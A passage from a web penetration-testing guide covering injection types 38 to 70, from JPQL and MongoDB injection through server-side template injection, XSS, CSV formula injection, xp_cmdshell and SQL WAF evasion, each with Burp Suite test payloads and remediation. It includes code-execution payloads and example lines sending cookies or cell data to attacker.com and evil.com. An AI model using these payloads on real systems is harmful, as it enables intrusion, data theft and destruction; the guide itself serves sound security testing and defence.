**Risk Rating**  
Critical

**Remediation**
- Use parameterized HQL/JPQL queries (named parameters)
- Use criteria API with type‑safe parameters

---

## 38. JPA INJECTION

**Description**  
JPA injection is similar to Hibernate injection, where JPQL queries are vulnerable to injection when user input is concatenated.

**What to Look For**
- JPQL queries built with string concatenation

**How to Test with Burp Suite**
1. Inject `' or 1=1--` in JPQL parameters.
2. If more results appear, injection is possible.

**Tools**
- Burp Repeater

**Risk Rating**  
Critical

**Remediation**
- Use parameterized JPQL queries
- Use JPA Criteria API

---

## 39. CASSANDRA CQL INJECTION

**Description**  
Cassandra uses CQL (Cassandra Query Language). Injection can occur when user input is concatenated into CQL statements.

**What to Look For**
- Applications using Cassandra
- Error messages containing `com.datastax.driver.core`

**How to Test with Burp Suite**
1. Inject `' AND 1=1;` to alter query logic.
2. Try to use `; DROP TABLE users;` if multiple statements are allowed.

**Tools**
- Burp Repeater
- Manual payloads

**Risk Rating**  
High

**Remediation**
- Use parameterized queries (prepared statements)
- Validate input

---

## 40. REDIS INJECTION

**Description**  
Redis injection can occur when user input is used in Redis commands without sanitization, potentially leading to data corruption or arbitrary command execution.

**What to Look For**
- Applications using Redis for caching or sessions
- Input used in `EVAL` or raw commands

**How to Test with Burp Suite**
1. Inject `\n` to break commands, e.g., `key\r\nSET evil 1`.
2. Try to inject Redis commands: `; CONFIG SET dir /tmp`

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
High

**Remediation**
- Use Redis libraries that handle escaping
- Avoid using user input in Redis commands

---

## 41. XQUERY INJECTION

**Description**  
XQuery injection occurs when user input is inserted into XQuery expressions, allowing attackers to bypass logic or extract XML data.

**What to Look For**
- XML databases (e.g., BaseX, eXist‑db)
- XQuery statements with user input

**How to Test with Burp Suite**
1. Inject `' or 1=1` to bypass conditions.
2. Use `) and 1=1)` to close expressions.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
High

**Remediation**
- Use parameterized XQuery
- Escape special characters

---

## 42. MONGODB QUERY INJECTION

**Description**  
MongoDB injection can occur when user input is used in query objects without sanitization, allowing attackers to use operators.

**What to Look For**
- MongoDB usage
- JSON or query strings passed to `find()`

**How to Test with Burp Suite**
1. Inject `{"$ne": null}` in parameters.
2. If the query returns more data, injection exists.

**Tools**
- NoSQLMap
- Burp Repeater

**Risk Rating**  
Critical

**Remediation**
- Validate and sanitize input
- Use MongoDB's `?` placeholders with proper driver methods

---

## 43. COUCHDB INJECTION

**Description**  
CouchDB injection occurs when user input is used in JavaScript views or `_find` queries, allowing operators like `$regex` to extract data.

**What to Look For**
- CouchDB endpoints (port 5984)
- User input in `_find` or `_view` parameters

**How to Test with Burp Suite**
1. In `_find`, inject `{"selector":{"username":{"$regex":".*"}}}` to get all users.

**Tools**
- Burp Repeater
- Manual payloads

**Risk Rating**  
High

**Remediation**
- Validate input, restrict operators
- Use server‑side validation

---

## 44. ELASTICSEARCH INJECTION

**Description**  
Elasticsearch injection can occur when user input is used in query strings or JSON queries, allowing attackers to access all documents.

**What to Look For**
- Elasticsearch endpoints (port 9200)
- `q=` parameter or JSON query

**How to Test with Burp Suite**
1. Use `?q=*:*` to return all documents.
2. Inject JSON operators like `{"match_all":{}}` to bypass filters.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
High

**Remediation**
- Validate input, use whitelist of allowed fields
- Avoid using user input directly in query strings

---

## 45. GRAPHQL QUERY INJECTION

**Description**  
GraphQL query injection is similar to SQLi, where attackers inject GraphQL syntax to manipulate queries.

**What to Look For**
- GraphQL endpoints
- Input that is reflected in GraphQL queries

**How to Test with Burp Suite**
1. Use `__schema` introspection to discover fields.
2. Try to inject `{ user(id: "1") { password } }` to retrieve sensitive data.

**Tools**
- GraphQL Raider
- Burp Repeater

**Risk Rating**  
High

**Remediation**
- Implement field‑level authorization
- Disable introspection in production

---

## 46. RESTQL INJECTION

**Description**  
RestQL is a query language for REST APIs. Injection can occur when user input is used in RestQL queries.

**What to Look For**
- Endpoints using RestQL
- Input used in `?q=`

**How to Test with Burp Suite**
1. Inject `; DROP TABLE users` if RestQL supports multiple statements.
2. Try to bypass authorization using `{"where":{"id":{"$gt":0}}}`.

**Tools**
- Burp Repeater

**Risk Rating**  
Medium

**Remediation**
- Use parameterized queries if supported
- Validate input

---

## 47. SERVER-SIDE JAVASCRIPT INJECTION (NODE.JS)

**Description**  
Server‑side JavaScript injection occurs when user input is passed to `eval()` or `Function()` in Node.js, allowing code execution.

**What to Look For**
- Usage of `eval()` with user input
- `vm.runInNewContext()` or similar

**How to Test with Burp Suite**
1. Inject `require('child_process').exec('id')` where input is evaluated.
2. Observe if command executes.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
Critical

**Remediation**
- Never use `eval()` with user input
- Use safe alternatives (e.g., `JSON.parse`)

---

## 48. SERVER-SIDE PYTHON INJECTION

**Description**  
Python injection occurs when user input is passed to `eval()`, `exec()`, or `pickle.loads()`, leading to code execution.

**What to Look For**
- Python code using `eval()`, `exec()`
- Pickle deserialization of user input

**How to Test with Burp Suite**
1. Inject `__import__('os').system('id')` where input is evaluated.
2. If command executes, injection is present.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
Critical

**Remediation**
- Avoid `eval()` and `exec()`
- Use safe deserialization (e.g., `json`)

---

## 49. SERVER-SIDE PHP INJECTION

**Description**  
PHP injection occurs when user input is passed to `eval()` or dynamic code inclusion.

**What to Look For**
- `eval($_POST['code'])`, `include($_GET['page'])`
- `create_function()` with user input

**How to Test with Burp Suite**
1. Inject `<?php system('id'); ?>` in input that is included.
2. If `id` output appears, injection is possible.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
Critical

**Remediation**
- Avoid `eval()` and dynamic inclusion
- Use whitelists for included files

---

## 50. SERVER-SIDE RUBY INJECTION

**Description**  
Ruby injection occurs when user input is passed to `eval()` or `ERB` templates.

**What to Look For**
- `eval(params[:code])`
- `ERB.new(template).result(binding)`

**How to Test with Burp Suite**
1. Inject `<%= system('id') %>` in ERB template input.
2. If command executes, injection is present.

**Tools**
- Burp Repeater

**Risk Rating**  
Critical

**Remediation**
- Avoid `eval()`
- Use safe template rendering

---

## 51. SERVER-SIDE .NET INJECTION

**Description**  
.NET injection occurs when user input is passed to `System.Diagnostics.Process.Start` or `CSharpCodeProvider`.

**What to Look For**
- Dynamic code compilation
- Use of `eval` in .NET (less common)

**How to Test with Burp Suite**
1. Inject `System.Diagnostics.Process.Start("cmd","/c whoami")` in parameters that are compiled/executed.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
Critical

**Remediation**
- Avoid dynamic code execution
- Use parameterized APIs

---

## 52. EXPRESSION LANGUAGE INJECTION (SPRING)

**Description**  
Spring Expression Language (SpEL) injection occurs when user input is evaluated as a SpEL expression, leading to remote code execution.

**What to Look For**
- Spring applications with SpEL evaluation
- Input in `@Value`, `@PreAuthorize`, etc.

**How to Test with Burp Suite**
1. Inject `T(java.lang.Runtime).getRuntime().exec('id')` in SpEL contexts.
2. If command executes, injection exists.

**Tools**
- Burp Repeater

**Risk Rating**  
Critical

**Remediation**
- Avoid evaluating user input with SpEL
- Use safe expression language with sandboxing

---

## 53. VELOCITY TEMPLATE INJECTION

**Description**  
Velocity template injection occurs when user input is rendered in Velocity templates without escaping, allowing code execution.

**What to Look For**
- Velocity templates used for email, reports, etc.
- Input inserted into templates

**How to Test with Burp Suite**
1. Inject `#set($x= $class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))` in Velocity context.

**Tools**
- Burp Repeater

**Risk Rating**  
Critical

**Remediation**
- Use sandboxed Velocity configuration
- Disable dangerous Velocity features

---

## 54. FREEMARKER TEMPLATE INJECTION

**Description**  
Freemarker injection occurs when user input is used in Freemarker templates, allowing code execution via the `new` built‑in.

**What to Look For**
- Freemarker template rendering with user input

**How to Test with Burp Suite**
1. Inject `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.

**Tools**
- Burp Repeater

**Risk Rating**  
Critical

**Remediation**
- Use Freemarker's safe mode (`TemplateClassResolver.SAFER_RESOLVER`)
- Validate input

---

## 55. JINJA2 TEMPLATE INJECTION

**Description**  
Jinja2 injection occurs when user input is rendered in Jinja2 templates, allowing SSTI and code execution.

**What to Look For**
- Jinja2 usage in Python applications

**How to Test with Burp Suite**
1. Inject `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`.

**Tools**
- Burp Repeater
- Tplmap

**Risk Rating**  
Critical

**Remediation**
- Use sandboxed Jinja2 environment
- Escape user input

---

## 56. TWIG TEMPLATE INJECTION

**Description**  
Twig injection occurs when user input is used in Twig templates, allowing SSTI.

**What to Look For**
- Twig usage in PHP applications

**How to Test with Burp Suite**
1. Inject `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`.

**Tools**
- Burp Repeater

**Risk Rating**  
Critical

**Remediation**
- Use Twig sandbox mode
- Validate input

---

## 57. SMARTY TEMPLATE INJECTION

**Description**  
Smarty injection occurs when user input is used in Smarty templates, allowing code execution via `{php}` tags.

**What to Look For**
- Smarty usage in PHP

**How to Test with Burp Suite**
1. Inject `{php} system('id'); {/php}` (if PHP tags enabled).

**Tools**
- Burp Repeater

**Risk Rating**  
Critical

**Remediation**
- Disable PHP tags in Smarty
- Use security policy

---

## 58. VUE.JS TEMPLATE INJECTION (CLIENT-SIDE)

**Description**  
Vue.js template injection occurs when user input is rendered as Vue templates, allowing client‑side XSS.

**What to Look For**
- Vue applications that render user input with `v-html` or dynamic templates
- Use of `{{{ }}}` in Vue 1

**How to Test with Burp Suite**
1. Inject `<img src=x onerror=alert(1)>` where `v-html` is used.
2. If alert triggers, injection exists.

**Tools**
- Browser DevTools
- Burp Repeater

**Risk Rating**  
High

**Remediation**
- Avoid `v-html` with user input
- Use `v-text` or safe rendering

---

## 59. ANGULAR TEMPLATE INJECTION

**Description**  
Angular template injection occurs when user input is inserted into Angular expressions, leading to XSS.

**What to Look For**
- Angular applications using `{{userInput}}` without sanitization
- Use of `$compile` with user input

**How to Test with Burp Suite**
1. Inject `{{constructor.constructor('alert(1)')()}}` in a context where Angular evaluates it.

**Tools**
- Browser DevTools

**Risk Rating**  
High

**Remediation**
- Use Angular's built‑in sanitization (`DomSanitizer`)
- Avoid dynamic compilation with user input

---

## 60. JAVASCRIPT INJECTION (CLIENT-SIDE)

**Description**  
Client‑side JavaScript injection occurs when user input is inserted into `<script>` contexts without escaping, allowing XSS.

**What to Look For**
- JavaScript variables assigned from user input: `var name = "{{input}}";`
- `eval()` of user input

**How to Test with Burp Suite**
1. Inject `"; alert(1); //` to break out of string.
2. If alert triggers, injection exists.

**Tools**
- Browser DevTools
- Burp Repeater

**Risk Rating**  
High

**Remediation**
- Use `JSON.stringify()` or safe JSON encoding
- Avoid `eval()` with user input

---

## 61. CSS INJECTION

**Description**  
CSS injection occurs when user input is inserted into CSS without escaping, allowing attackers to exfiltrate data or deface the page.

**What to Look For**
- User‑controlled styles (custom themes, profile colors)
- CSS properties like `background-image` or `expression`

**How to Test with Burp Suite**
1. Inject `background-image: url('http://attacker.com/steal?cookie='+document.cookie);` in CSS input.
2. If the browser makes a request, injection is possible.

**Tools**
- Burp Collaborator

**Risk Rating**  
Medium

**Remediation**
- Encode CSS strings
- Use a whitelist of allowed CSS properties

---

## 62. HTML INJECTION

**Description**  
HTML injection occurs when user input is inserted into HTML without escaping, allowing attackers to inject arbitrary HTML tags (but not necessarily JavaScript).

**What to Look For**
- Input reflected in HTML without encoding
- Ability to add HTML tags like `<a>`, `<div>`

**How to Test with Burp Suite**
1. Inject `<h1>Hello</h1>` in a field.
2. If the heading appears, HTML injection is present.

**Tools**
- Burp Repeater

**Risk Rating**  
Medium

**Remediation**
- HTML‑encode user input (use `&lt;`, `&gt;`, etc.)

---

## 63. SVG INJECTION

**Description**  
SVG injection occurs when user‑supplied SVG files are uploaded and rendered, allowing XSS via `<script>` tags inside the SVG.

**What to Look For**
- SVG upload functionality
- Rendering of SVG images directly

**How to Test with Burp Suite**
1. Upload an SVG with `<svg onload="alert(1)"/>` or `<script>alert(1)</script>`.
2. If alert triggers, injection exists.

**Tools**
- Burp Repeater

**Risk Rating**  
High

**Remediation**
- Sanitize SVG files (strip scripts)
- Serve SVGs with `Content-Disposition: attachment`

---

## 64. MARKDOWN INJECTION

**Description**  
Markdown injection occurs when user input is rendered as Markdown without sanitization, allowing XSS via HTML injection in Markdown (depending on the parser).

**What to Look For**
- Markdown rendering (e.g., comments, posts)

**How to Test with Burp Suite**
1. Inject `<img src=x onerror=alert(1)>` (if HTML allowed).
2. Use Markdown syntax to inject JavaScript: `[click](javascript:alert(1))`.

**Tools**
- Burp Repeater

**Risk Rating**  
Medium

**Remediation**
- Use a Markdown parser that strips dangerous HTML
- Use HTML sanitizer after rendering

---

## 65. CSV INJECTION

**Description**  
CSV injection occurs when user input is included in a CSV file that is opened in a spreadsheet application, leading to formula injection.

**What to Look For**
- Export functionality that generates CSV
- User input reflected in CSV cells

**How to Test with Burp Suite**
1. Inject `=HYPERLINK("http://evil.com/steal?data="&A1,"Click")` in a field.
2. If the exported CSV contains the formula, injection exists.

**Tools**
- Burp Repeater

**Risk Rating**  
Medium

**Remediation**
- Prefix cells with a single quote `'` to prevent formula interpretation
- Use proper CSV encoding libraries

---

## 66. FORMULA INJECTION (EXCEL)

**Description**  
Formula injection is a subset of CSV injection where formulas like `=cmd|' /C calc'!A0` can be used to execute commands when the spreadsheet is opened in vulnerable applications.

**What to Look For**
- Same as CSV injection

**How to Test with Burp Suite**
1. Inject `=cmd|' /C calc'!A0` in a field.
2. If the exported CSV contains the payload, formula injection exists.

**Tools**
- Burp Repeater

**Risk Rating**  
Medium

**Remediation**
- Same as CSV injection

---

## 67. LDAP (BIND) INJECTION

**Description**  
LDAP bind injection occurs when user input is used in the bind DN, allowing attackers to bypass authentication.

**What to Look For**
- LDAP authentication with user‑supplied DN

**How to Test with Burp Suite**
1. In username field, inject `*` to authenticate as any user.
2. Use `admin)(&)` to close filter and add an OR condition.

**Tools**
- Burp Repeater
- ldapsearch

**Risk Rating**  
High

**Remediation**
- Escape special characters in bind DN
- Use parameterized LDAP queries

---

## 68. XPATH INJECTION (BLIND)

**Description**  
Blind XPath injection uses boolean conditions to extract data when error messages are suppressed.

**What to Look For**
- XPath queries with user input
- No visible output

**How to Test with Burp Suite**
1. Inject `' and '1'='1` and compare with `' and '1'='2`.
2. If responses differ, blind XPath exists.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
High

**Remediation**
- Parameterize XPath queries
- Escape input

---

## 69. SQL INJECTION (STORED PROCEDURE)

**Description**  
Stored procedure injection occurs when user input is concatenated into stored procedure calls without parameterization.

**What to Look For**
- Calls to stored procedures with dynamic SQL inside
- Error messages from the database

**How to Test with Burp Suite**
1. Inject `'; EXEC xp_cmdshell 'whoami';--` in a parameter used in a stored procedure.
2. If command executes, injection is possible.

**Tools**
- SQLMap (supports stored procedures)
- Burp Repeater

**Risk Rating**  
Critical

**Remediation**
- Use parameterized stored procedures
- Avoid dynamic SQL inside procedures

---

## 70. SQL INJECTION (WAF EVASION)

**Description**  
WAF evasion techniques help bypass web application firewalls that block standard injection patterns.

**What to Look For**
- WAF blocks simple payloads but not advanced ones

**How to Test with Burp Suite**
1. Use case variations: `SeLeCt`
2. Use comments: `/**/`, `/*!50000UNION*/`
3. Use encoding: `%55%4E%49%4F%4E`
4. Use concatenation: `' UNI'||'ON'`
5. Use alternative syntax: `LIKE`, `BETWEEN`

**Tools**
- Burp Repeater
- SQLMap (with `--tamper` option)

**Risk Rating**  
Critical

**Remediation**
- Use parameterized queries (WAF is not a fix)
- Keep WAF rules updated

---

## ✅ **SUMMARY**

Injection vulnerabilities remain the most critical web application security risk. This guide covers 70 distinct injection types across databases, operating systems, templates, and more. Each type requires careful testing and proper remediation.

### **Key Takeaways**
- **Injection is about breaking context** – understand the target language/syntax.
- **Use parameterized queries** for SQL, LDAP, and other structured queries.
- **Sanitize input** but never rely on it alone; use safe APIs.
- **Test both manual and automated** (Burp Suite, SQLMap, Commix, NoSQLMap).
- **WAF is not a solution** – secure coding is.

---

*This guide is for professional security testing purposes only. Unauthorized testing is illegal.*
